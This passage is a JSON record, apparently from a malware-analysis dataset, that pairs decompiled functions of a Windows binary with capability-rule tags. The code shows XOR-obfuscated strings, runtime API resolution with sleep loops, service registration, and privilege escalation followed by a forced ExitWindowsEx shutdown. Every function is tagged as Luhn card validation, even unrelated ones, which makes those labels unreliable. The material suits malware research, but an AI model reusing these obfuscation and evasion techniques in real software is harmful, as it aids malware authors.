    },
    "004115b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004115b0(uint arg_8h)\n\n{\n    uint32_t var_4h;\n    \n    *0x436c10 = arg_8h;\n    *0x437f90 = 0x270;\n    for (var_4h = 1; var_4h < 0x270; var_4h = var_4h + 1) {\n        *(var_4h * 4 + 0x436c10) = (*(var_4h * 4 + 0x436c0c) >> 0x1e ^ *(var_4h * 4 + 0x436c0c)) * 0x6c078965 + var_4h;\n    }\n    return;\n}\n",
        "token_count": 168
    },
    "00411800": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00411800(uint *arg_8h)\n\n{\n    if (*0x436ad8 == '\\0') {\n        fcn.004115b0(*arg_8h);\n        *0x436ad8 = '\\x01';\n    }\n    fcn.004110e0();\n    return;\n}\n",
        "token_count": 72
    },
    "00411b40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "run as service/d064d29e3d74448f8f6f16837eb4b2f8"
        ],
        "decompiled_code": "\nvoid fcn.00411b40(void)\n\n{\n    int32_t lpServiceStartTable;\n    code *var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    lpServiceStartTable = (*_sym.imp.SHLWAPI.dll_StrRChrW)(*0x436b44, 0, 0x5c);\n    lpServiceStartTable = lpServiceStartTable + 2;\n    var_10h = fcn.00411ac0;\n    var_ch = 0;\n    var_8h = 0;\n    var_4h = lpServiceStartTable;\n    (*_sym.imp.ADVAPI32.dll_StartServiceCtrlDispatcherW)(&lpServiceStartTable);\n    return;\n}\n",
        "token_count": 167
    },
    "00411b90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00411b90(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_28h;\n    uchar var_24h;\n    uchar var_23h;\n    uchar var_22h;\n    uchar var_21h;\n    uchar var_20h;\n    uchar var_1fh;\n    uchar var_1eh;\n    uchar var_1dh;\n    uchar var_1ch;\n    uchar var_1bh;\n    uchar var_1ah;\n    uchar var_19h;\n    uchar var_18h;\n    uchar var_17h;\n    uchar var_16h;\n    uchar var_15h;\n    uchar var_14h;\n    uint var_10h;\n    uchar var_ch;\n    uchar var_bh;\n    int32_t var_4h;\n    \n    var_28h._0_1_ = 0x30;\n    var_28h._1_1_ = 0x21;\n    var_28h._2_1_ = 0x5f;\n    var_28h._3_1_ = 0x29;\n    var_24h = 0x26;\n    var_23h = 0x10;\n    var_22h = 0;\n    var_21h = 0x35;\n    var_20h = 0x42;\n    var_1fh = 0x28;\n    var_1eh = 0x36;\n    var_1dh = 7;\n    var_1ch = 0x14;\n    var_1bh = 0x21;\n    var_1ah = 0x53;\n    var_19h = 0x23;\n    var_18h = 0x11;\n    var_17h = 0xb;\n    var_16h = 4;\n    var_15h = 0x38;\n    var_14h = 0x36;\n    var_10h._0_1_ = 0x65;\n    var_10h._1_1_ = 0x54;\n    var_10h._2_1_ = 0x36;\n    var_10h._3_1_ = 0x4d;\n    var_ch = 0x65;\n    var_bh = 0x62;\n    fcn.004012a0(0x15);\n    for (var_4h = 0; var_4h < 0x15; var_4h = var_4h + 1) {\n        fcn.00401280(var_4h, *(&var_28h + var_4h) ^ *(&var_10h + var_4h % 6));\n    }\n    while( true ) {\n        uVar1 = fcn.00401270();\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(0, uVar1);\n        if (iVar2 != 0) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n    }\n    fcn.004012d0();\n    return;\n}\n",
        "token_count": 686
    },
    "004150f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004150f0(void)\n\n{\n    char cVar1;\n    \n    *0x436b04 = 1;\n    fcn.004212a0();\n    fcn.00415dc0();\n    cVar1 = fcn.00415900(*0x436b44);\n    if (cVar1 != '\\0') {\n        fcn.00416720(*0x436b44);\n    }\n    fcn.00415150();\n    (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n    fcn.00415c70();\n    return;\n}\n",
        "token_count": 129
    },
    "00415c70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00415c70(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_38h;\n    uchar var_34h;\n    uchar var_33h;\n    uchar var_32h;\n    uchar var_31h;\n    uchar var_30h;\n    uchar var_2fh;\n    uchar var_2eh;\n    uchar var_2dh;\n    uchar var_2ch;\n    uchar var_2bh;\n    uchar var_2ah;\n    uchar var_29h;\n    uchar var_28h;\n    uchar var_27h;\n    uchar var_26h;\n    uchar var_25h;\n    uint var_24h;\n    uint var_20h;\n    uint uStack28;\n    uint var_14h;\n    uchar var_10h;\n    uint TokenHandle;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_38h._0_1_ = 0x19;\n    var_38h._1_1_ = 0x17;\n    var_38h._2_1_ = 99;\n    var_38h._3_1_ = 0x5f;\n    var_34h = 0x1c;\n    var_33h = 0x3e;\n    var_32h = 0x16;\n    var_31h = 0x5f;\n    var_30h = 0x40;\n    var_2fh = 7;\n    var_2eh = 0x1a;\n    var_2dh = 0;\n    var_2ch = 0x59;\n    var_2bh = 0x41;\n    var_2ah = 0;\n    var_29h = 0x26;\n    var_28h = 0x17;\n    var_27h = 0x57;\n    var_26h = 0x52;\n    var_25h = 0x69;\n    var_14h._0_1_ = 0x4a;\n    var_14h._1_1_ = 0x72;\n    var_14h._2_1_ = 0x30;\n    var_14h._3_1_ = 0x37;\n    var_10h = 0x69;\n    fcn.004012a0(0x14);\n    for (var_4h = 0; var_4h < 0x14; var_4h = var_4h + 1) {\n        fcn.00401280(var_4h, *(&var_38h + var_4h) ^ *(&var_14h + var_4h % 5));\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x28, &TokenHandle);\n    (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar1);\n    uVar1 = fcn.00401270(&var_20h);\n    (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, uVar1);\n    var_24h = 1;\n    uStack28 = 2;\n    (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &var_24h, 0, 0, 0);\n    iVar2 = (*_sym.imp.USER32.dll_ExitWindowsEx)(6, 0);\n    if (iVar2 == 0) {\n        (*_sym.imp.USER32.dll_ExitWindowsEx)(4, 0);\n    }\n    fcn.004012d0();\n    return;\n}\n",
        "token_count": 814
    },
    "00416fa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00416fa0(int32_t arg_8h)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    return CONCAT44(*(arg_8h + 0x3c) >> 0x1f, arg_8h + *(arg_8h + 0x3c));\n}\n",
        "token_count": 76
    },
    "00417460": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00417460(uint16_t *arg_8h)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar2 = *arg_8h;\n    if (uVar2 == 0x5a4d) {\n        uVar2 = *(arg_8h + 0x1e) >> 0x1f;\n        if (*(arg_8h + *(arg_8h + 0x1e)) == 0x4550) {\n            uVar1 = 1;\n            goto code_r0x004174a5;\n        }\n    }\n    uVar1 = 0;\ncode_r0x004174a5:\n    return CONCAT44(uVar2, uVar1);\n}\n",
        "token_count": 181
    },
    "00417810": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00417810(uint arg_8h)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = arg_8h;\n    var_4h = 0;\n    fcn.00417510(fcn.004174e0, &var_8h);\n    return var_4h;\n}\n",
        "token_count": 81
    },
    "0041a210": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0041a210(uint pszFirst)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_24h;\n    uchar var_20h;\n    uchar var_1fh;\n    uchar var_1eh;\n    uchar var_1dh;\n    uchar var_1ch;\n    uchar var_1bh;\n    uchar var_1ah;\n    uchar var_19h;\n    uint8_t var_18h [4];\n    uchar var_14h;\n    uchar var_13h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_24h._0_1_ = 0x1f;\n    var_24h._1_1_ = 99;\n    var_24h._2_1_ = 0x2d;\n    var_24h._3_1_ = 0x35;\n    var_20h = 7;\n    var_1fh = 0x54;\n    var_1eh = 0x41;\n    var_1dh = 99;\n    var_1ch = 0x2d;\n    var_1bh = 0x35;\n    var_1ah = 0x62;\n    var_19h = 0x54;\n    var_18h[0] = 0x32;\n    var_18h[1] = 99;\n    var_18h[2] = 0x59;\n    var_18h[3] = 0x35;\n    var_14h = 0x62;\n    var_13h = 0x54;\n    fcn.004012a0(0x18);\n    for (var_4h = 0; var_4h < 0xc; var_4h = var_4h + 1) {\n        fcn.00401280(var_4h, *(&var_24h + var_4h) ^ var_18h[var_4h % 6]);\n    }\n    uVar1 = fcn.00401270();\n    iVar2 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszFirst, uVar1);\n    var_ch = iVar2 != 0;\n    var_10h = var_ch;\n    fcn.004012d0();\n    return var_10h;\n}\n",
        "token_count": 545
    },
    "0041a300": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0041a300(uint pszFirst)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_2ch;\n    uchar var_28h;\n    uchar var_27h;\n    uchar var_26h;\n    uchar var_25h;\n    uchar var_24h;\n    uchar var_23h;\n    uchar var_22h;\n    uchar var_21h;\n    uchar var_20h;\n    uchar var_1fh;\n    uchar var_1eh;\n    uchar var_1dh;\n    uchar var_1ch;\n    uchar var_1bh;\n    uint8_t var_18h [4];\n    uchar var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_2ch._0_1_ = 0x52;\n    var_2ch._1_1_ = 0x36;\n    var_2ch._2_1_ = 0x7d;\n    var_2ch._3_1_ = 0x4f;\n    var_28h = 0x62;\n    var_27h = 0x72;\n    var_26h = 0x40;\n    var_25h = 0x50;\n    var_24h = 0x38;\n    var_23h = 0x4f;\n    var_22h = 10;\n    var_21h = 0x36;\n    var_20h = 0x29;\n    var_1fh = 0x4f;\n    var_1eh = 0x35;\n    var_1dh = 0x72;\n    var_1ch = 0x36;\n    var_1bh = 0x50;\n    var_18h[0] = 0x72;\n    var_18h[1] = 0x36;\n    var_18h[2] = 0x50;\n    var_18h[3] = 0x4f;\n    var_14h = 0x4f;\n    fcn.004012a0(0x24);\n    for (var_4h = 0; var_4h < 0x12; var_4h = var_4h + 1) {\n        fcn.00401280(var_4h, *(&var_2ch + var_4h) ^ var_18h[var_4h % 5]);\n    }\n    uVar1 = fcn.00401270();\n    iVar2 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszFirst, uVar1);\n    var_ch = iVar2 != 0;\n    var_10h = var_ch;\n    fcn.004012d0();\n    return var_10h;\n}\n",
        "token_count": 645
    },
    "0041b2e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nchar * __cdecl fcn.0041b2e0(char *arg_8h, uint arg_ch)\n\n{\n    uint var_1h;\n    \n    while( true ) {\n        if (*arg_8h == arg_ch) {\n            return arg_8h;\n        }\n        if (*arg_8h == '\\0') break;\n        arg_8h = arg_8h + 1;\n    }\n    return NULL;\n}\n",
        "token_count": 111
    },
    "0041b350": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.0041b350(int16_t *arg_8h, uint arg_ch)\n\n{\n    int16_t *var_4h;\n    \n    var_4h = NULL;\n    while( true ) {\n        if (*arg_8h == arg_ch) {\n            var_4h = arg_8h;\n        }\n        if (*arg_8h == 0) break;\n        arg_8h = arg_8h + 1;\n    }\n    return var_4h;\n}\n",
        "token_count": 115
    },
    "0041b390": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint8_t * __cdecl fcn.0041b390(uint8_t *arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t *var_4h;\n    \n    for (var_4h = arg_8h; *var_4h != 0; var_4h = var_4h + 1) {\n        uVar1 = fcn.0041b320(*var_4h);\n        *var_4h = uVar1;\n    }\n    return arg_8h;\n}\n",
        "token_count": 118
    },
    "0041b450": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041b450(int32_t arg_8h)\n\n{\n    uint var_4h;\n    \n    return arg_8h + *(arg_8h + 0x3c);\n}\n",
        "token_count": 50
    },
    "0041b590": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041b590(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.0041b450(arg_8h);\n    if (*(iVar1 + 4) == -0x799c) {\n        var_8h = *(iVar1 + 0x88);\n    }\n    else {\n        var_8h = *(iVar1 + 0x78);\n    }\n    var_8h = arg_8h + var_8h;\n    return var_8h;\n}\n",
        "token_count": 145
    },
    "0041b5f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0041b5f0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h = arg_8h + *(arg_8h + 0x3c);\n    var_ch = arg_8h + 0x18 + *(arg_8h + 0x14);\n    var_4h._0_2_ = *(arg_8h + 6);\n    while( true ) {\n        uVar1 = *(var_ch + 0xc);\n        if ((uVar1 <= arg_ch) &&\n           (arg_ch < uVar1 + (*(var_ch + 0x10) + -1 + *(arg_8h + 0x3c) & ~(*(arg_8h + 0x3c) - 1U)))) break;\n        var_ch = var_ch + 0x28;\n        var_4h._0_2_ = var_4h + -1;\n        if (var_4h == 0) {\n            return 0;\n        }\n    }\n    return (arg_ch - uVar1) + *(var_ch + 0x14);\n}\n",
        "token_count": 317
    },
    "0041c480": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041c480(void)\n\n{\n    uint uVar1;\n    uint var_40h;\n    uchar var_3ch;\n    uchar var_3bh;\n    uchar var_3ah;\n    uchar var_39h;\n    uchar var_38h;\n    uchar var_37h;\n    uchar var_36h;\n    uchar var_35h;\n    uchar var_34h;\n    uint var_30h;\n    uchar var_2ch;\n    uchar var_2bh;\n    uchar var_2ah;\n    uchar var_29h;\n    uchar var_28h;\n    uchar var_27h;\n    uchar var_26h;\n    uchar var_25h;\n    uchar var_24h;\n    uint var_20h;\n    uchar var_1ch;\n    uchar var_1bh;\n    uint var_18h;\n    uchar var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_30h._0_1_ = 0xf;\n    var_30h._1_1_ = 0x1f;\n    var_30h._2_1_ = 0x28;\n    var_30h._3_1_ = 0x24;\n    var_2ch = 0x18;\n    var_2bh = 0x38;\n    var_2ah = 0x1a;\n    var_29h = 0xb;\n    var_28h = 0x25;\n    var_27h = 8;\n    var_26h = 0x2b;\n    var_25h = 0xf;\n    var_24h = 0x5a;\n    var_18h._0_1_ = 0x59;\n    var_18h._1_1_ = 0x76;\n    var_18h._2_1_ = 0x5a;\n    var_18h._3_1_ = 0x50;\n    var_14h = 0x6d;\n    fcn.004012a0(0xd);\n    for (var_4h = 0; var_4h < 0xd; var_4h = var_4h + 1) {\n        fcn.00401280(var_4h, *(&var_30h + var_4h) ^ *(&var_18h + var_4h % 5));\n    }\n    var_40h._0_1_ = 0xd;\n    var_40h._1_1_ = 0x51;\n    var_40h._2_1_ = 0x36;\n    var_40h._3_1_ = 0x5a;\n    var_3ch = 0x3f;\n    var_3bh = 0;\n    var_3ah = 0x55;\n    var_39h = 6;\n    var_38h = 0x6a;\n    var_37h = 0x50;\n    var_36h = 0x36;\n    var_35h = 0;\n    var_34h = 0x66;\n    var_20h._0_1_ = 0x66;\n    var_20h._1_1_ = 0x34;\n    var_20h._2_1_ = 0x44;\n    var_20h._3_1_ = 0x34;\n    var_1ch = 0x5a;\n    var_1bh = 0x6c;\n    fcn.004012a0(0xd);\n    for (var_8h = 0; var_8h < 0xd; var_8h = var_8h + 1) {\n        fcn.00401280(var_8h, *(&var_40h + var_8h) ^ *(&var_20h + var_8h % 6));\n    }\n    uVar1 = fcn.00401270();\n    uVar1 = fcn.00401270(uVar1);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(uVar1);\n    *0x436b10 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    fcn.004012d0();\n    fcn.004012d0();\n    return;\n}\n",
        "token_count": 990
    },
    "0041c800": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041c800(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h, uint *arg_1ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0041b6a0(arg_8h, &arg_ch, arg_14h, arg_18h);\n    *arg_1ch = uVar1;\n    return *arg_1ch;\n}\n",
        "token_count": 107
    },
    "0041d4a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041d4a0(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h, uint *arg_1ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0041b8e0(arg_8h, &arg_ch, arg_14h, arg_18h);\n    *arg_1ch = uVar1;\n    return *arg_1ch;\n}\n",
        "token_count": 109
    },
    "0041f8c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0041f8c0(uint lpszLongPath)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_b44h;\n    uint var_93ch;\n    uint ARG_0;\n    uint lpszShortPath;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint *var_10ch;\n    uint *var_108h;\n    uint var_100h;\n    uint hObject;\n    uint var_e0h;\n    uint var_dch;\n    int32_t var_d8h;\n    code *var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uchar var_b4h;\n    uchar var_b3h;\n    uchar var_b2h;\n    uchar var_b1h;\n    uchar var_b0h;\n    uchar var_afh;\n    uchar var_aeh;\n    uchar var_adh;\n    uchar var_ach;\n    uchar var_abh;\n    uchar var_aah;\n    uchar var_a9h;\n    uchar var_a8h;\n    uchar var_a7h;\n    uchar var_a6h;\n    uchar var_a5h;\n    uchar var_a4h;\n    uchar var_a3h;\n    uchar var_a2h;\n    uchar var_a1h;\n    uchar var_a0h;\n    uchar var_9fh;\n    uchar var_9eh;\n    uchar var_9dh;\n    uchar var_9ch;\n    uchar var_9bh;\n    uchar var_9ah;\n    uchar var_99h;\n    uchar var_98h;\n    uchar var_97h;\n    uchar var_96h;\n    uchar var_95h;\n    uchar var_94h;\n    uchar var_93h;\n    uchar var_92h;\n    uchar var_91h;\n    uchar var_90h;\n    uchar var_8fh;\n    uchar var_8eh;\n    uchar var_8dh;\n    uchar var_8ch;\n    uchar var_8bh;\n    uchar var_8ah;\n    uchar var_89h;\n    uchar var_88h;\n    uchar var_87h;\n    uchar var_86h;\n    uchar var_85h;\n    uint8_t var_84h [4];\n    uchar var_80h;\n    uchar var_7fh;\n    uchar var_7eh;\n    uchar var_7dh;\n    uchar var_7ch;\n    uchar var_7bh;\n    uchar var_7ah;\n    uchar var_79h;\n    uchar var_78h;\n    uchar var_77h;\n    uchar var_76h;\n    uchar var_75h;\n    uchar var_74h;\n    uchar var_73h;\n    uchar var_72h;\n    uchar var_71h;\n    uchar var_70h;\n    uchar var_6fh;\n    uchar var_6eh;\n    uchar var_6dh;\n    uchar var_6ch;\n    uchar var_6bh;\n    uchar var_6ah;\n    uchar var_69h;\n    uchar var_68h;\n    uchar var_67h;\n    uint8_t var_64h [4];\n    uchar var_60h;\n    uchar var_5fh;\n    uchar var_5eh;\n    uchar var_5dh;\n    uchar var_5ch;\n    uchar var_5bh;\n    uchar var_5ah;\n    uchar var_59h;\n    uchar var_58h;\n    uchar var_57h;\n    uchar var_56h;\n    uchar var_55h;\n    uint var_54h;\n    uchar var_50h;\n    uchar var_4fh;\n    uchar var_4eh;\n    uchar var_4dh;\n    uchar var_4ch;\n    uchar var_4bh;\n    uchar var_4ah;\n    uchar var_49h;\n    uint var_48h;\n    uchar var_44h;\n    uchar var_43h;\n    uchar var_42h;\n    uchar var_41h;\n    uchar var_40h;\n    uchar var_3fh;\n    uchar var_3eh;\n    uchar var_3dh;\n    uint8_t var_3ch [4];\n    uchar var_38h;\n    uchar var_37h;\n    uint var_34h;\n    uchar var_30h;\n    uchar var_2fh;\n    uint var_2ch;\n    uchar var_28h;\n    uchar var_27h;\n    uint var_24h;\n    uchar var_20h;\n    uchar var_1fh;\n    uint var_1ch;\n    uchar var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_d0h = 0;\n    var_dch = 0;\n    var_e0h = 0xffffffff;\n    puVar3 = &var_93ch;\n    for (iVar2 = 0x410; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = &var_b44h;\n    for (iVar2 = 0x208; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = &ARG_0;\n    for (iVar2 = 0x208; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = &lpszShortPath;\n    for (iVar2 = 0x208; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_b8h._0_1_ = 0x56;\n    var_b8h._1_1_ = 0x51;\n    var_b8h._2_1_ = 0x43;\n    var_b8h._3_1_ = 0x53;\n    var_b4h = 0x18;\n    var_b3h = 0x73;\n    var_b2h = 0x3f;\n    var_b1h = 0x34;\n    var_b0h = 0x37;\n    var_afh = 0x71;\n    var_aeh = 0x1a;\n    var_adh = 0x51;\n    var_ach = 0x46;\n    var_abh = 0x53;\n    var_aah = 0x54;\n    var_a9h = 0x73;\n    var_a8h = 0xd;\n    var_a7h = 0x34;\n    var_a6h = 0x20;\n    var_a5h = 0x71;\n    var_a4h = 10;\n    var_a3h = 0x51;\n    var_a2h = 0x47;\n    var_a1h = 0x53;\n    var_a0h = 5;\n    var_9fh = 0x73;\n    var_9eh = 0x34;\n    var_9dh = 0x34;\n    var_9ch = 0x3e;\n    var_9bh = 0x71;\n    var_9ah = 0x40;\n    var_99h = 0x51;\n    var_98h = 6;\n    var_97h = 0x53;\n    var_96h = 0x2d;\n    var_95h = 0x73;\n    var_94h = 0x32;\n    var_93h = 0x34;\n    var_92h = 0x3e;\n    var_91h = 0x71;\n    var_90h = 0x17;\n    var_8fh = 0x51;\n    var_8eh = 0x1a;\n    var_8dh = 0x53;\n    var_8ch = 0x14;\n    var_8bh = 0x73;\n    var_8ah = 0x29;\n    var_89h = 0x34;\n    var_88h = 0x36;\n    var_87h = 0x71;\n    var_86h = 0x73;\n    var_85h = 0x51;\n    var_1ch._0_1_ = 0x73;\n    var_1ch._1_1_ = 0x51;\n    var_1ch._2_1_ = 0x34;\n    var_1ch._3_1_ = 0x53;\n    var_18h = 0x71;\n    fcn.004012a0(0x68);\n    for (var_4h = 0; var_4h < 0x34; var_4h = var_4h + 1) {\n        fcn.00401280(var_4h, *(&var_b8h + var_4h) ^ *(&var_1ch + var_4h % 5));\n    }\n    uVar1 = fcn.00401270(&var_93ch, 0x104);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(uVar1);\n    (*_sym.imp.KERNEL32.dll_GetShortPathNameW)(lpszLongPath, &lpszShortPath, 0x104);\n    var_84h[0] = 0x54;\n    var_84h[1] = 0x45;\n    var_84h[2] = 0x18;\n    var_84h[3] = 0x69;\n    var_80h = 0x30;\n    var_7fh = 0x6a;\n    var_7eh = 0x54;\n    var_7dh = 0x45;\n    var_7ch = 0x15;\n    var_7bh = 0x69;\n    var_7ah = 0x20;\n    var_79h = 0x6a;\n    var_78h = 0;\n    var_77h = 0x45;\n    var_76h = 0x56;\n    var_75h = 0x69;\n    var_74h = 0x21;\n    var_73h = 0x6a;\n    var_72h = 0;\n    var_71h = 0x45;\n    var_70h = 0x17;\n    var_6fh = 0x69;\n    var_6eh = 0x76;\n    var_6dh = 0x6a;\n    var_6ch = 7;\n    var_6bh = 0x45;\n    var_6ah = 0x15;\n    var_69h = 0x69;\n    var_68h = 0x53;\n    var_67h = 0x6a;\n    var_24h._0_1_ = 0x74;\n    var_24h._1_1_ = 0x45;\n    var_24h._2_1_ = 0x37;\n    var_24h._3_1_ = 0x69;\n    var_20h = 0x53;\n    var_1fh = 0x6a;\n    fcn.004012a0(0x3c);\n    for (var_8h = 0; var_8h < 0x1e; var_8h = var_8h + 1) {\n        fcn.00401280(var_8h, var_84h[var_8h] ^ *(&var_24h + var_8h % 6));\n    }\n    uVar1 = fcn.00401270(&lpszShortPath);\n    (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, uVar1);\n    puVar3 = &var_11ch;\n    for (iVar2 = 0x3c; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_48h._0_1_ = 0x16;\n    var_48h._1_1_ = 0x4a;\n    var_48h._2_1_ = 7;\n    var_48h._3_1_ = 0x35;\n    var_44h = 0x21;\n    var_43h = 0x32;\n    var_42h = 5;\n    var_41h = 0x4a;\n    var_40h = 1;\n    var_3fh = 0x35;\n    var_3eh = 0x4f;\n    var_3dh = 0x32;\n    var_2ch._0_1_ = 100;\n    var_2ch._1_1_ = 0x4a;\n    var_2ch._2_1_ = 0x72;\n    var_2ch._3_1_ = 0x35;\n    var_28h = 0x4f;\n    var_27h = 0x32;\n    fcn.004012a0(0x18);\n    for (var_ch = 0; var_ch < 0xc; var_ch = var_ch + 1) {\n        fcn.00401280(var_ch, *(&var_48h + var_ch) ^ *(&var_2ch + var_ch % 6));\n    }\n    var_11ch = 0x3c;\n    var_110h = fcn.00401270();\n    var_10ch = &var_93ch;\n    var_108h = &ARG_0;\n    var_100h = 3;\n    var_118h = 0x40;\n    (*_sym.imp.ole32.dll_CoInitializeEx)(0, 6);\n    var_54h._0_1_ = 0x26;\n    var_54h._1_1_ = 0x2c;\n    var_54h._2_1_ = 0x28;\n    var_54h._3_1_ = 0x1d;\n    var_50h = 0x36;\n    var_4fh = 0x78;\n    var_4eh = 0x47;\n    var_4dh = 0x4a;\n    var_4ch = 9;\n    var_4bh = 0x3d;\n    var_4ah = 0x16;\n    var_49h = 0x4b;\n    var_34h._0_1_ = 0x75;\n    var_34h._1_1_ = 100;\n    var_34h._2_1_ = 0x6d;\n    var_34h._3_1_ = 0x51;\n    var_30h = 0x7a;\n    var_2fh = 0x4b;\n    fcn.004012a0(0xc);\n    for (var_10h = 0; var_10h < 0xc; var_10h = var_10h + 1) {\n        fcn.00401280(var_10h, *(&var_54h + var_10h) ^ *(&var_34h + var_10h % 6));\n 